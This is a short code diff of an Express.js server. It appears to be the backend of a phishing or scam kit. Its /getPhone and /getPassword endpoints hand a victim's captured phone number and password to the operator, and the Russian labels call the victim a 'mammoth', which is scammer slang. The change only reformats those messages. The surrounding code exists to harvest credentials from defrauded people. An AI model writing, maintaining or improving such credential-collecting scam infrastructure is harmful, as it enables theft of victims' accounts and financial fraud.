@@ -45,7 +45,7 @@ app.post('/phone', (req, res) => {
 });
 app.get('/getPhone', (req, res) => {
     if(pn){
-        res.send(`Номер телефона мамонта: ${pn}`);
+        res.send(`Номер телефона мамонта: \n ${pn}`);
         pn = undefined;
         return 0;
     } else {
@@ -95,7 +95,7 @@ app.post('/password', (req, res) => {
 
 app.get('/getPassword', (req, res) => {
     if(pass){
-        res.send(`Пароль мамонта: ${pass}`);
+        res.send(`Пароль мамонта: \n ${pass}`);
         pass = undefined;
         return;
     } else {
